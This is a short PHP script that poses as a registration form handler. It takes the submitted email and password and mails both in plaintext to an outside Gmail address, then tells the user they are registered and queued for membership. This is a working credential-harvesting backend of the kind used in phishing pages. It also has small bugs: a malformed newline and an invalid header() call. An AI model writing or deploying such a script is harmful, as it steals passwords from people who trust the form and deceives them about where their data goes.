<?php
// Get the form data
$email = $_POST['email'];
$password = $_POST['password'];

// Send an email with the form data
$to = 'imtrollmastr@gmail.com';
$subject = 'New Queued User';
$message = "nEmail: $email\nPassword: $password";
$headers = 'From: testuser@imtrollmastr.com';
mail($to, $subject, $message, $headers);

// Display a confirmation message to the user
echo 'Thank you for registering!';

// Redirect the user to a private page or display a message indicating they will receive access soon
header('You have been queued for further selection of login membership.');
?>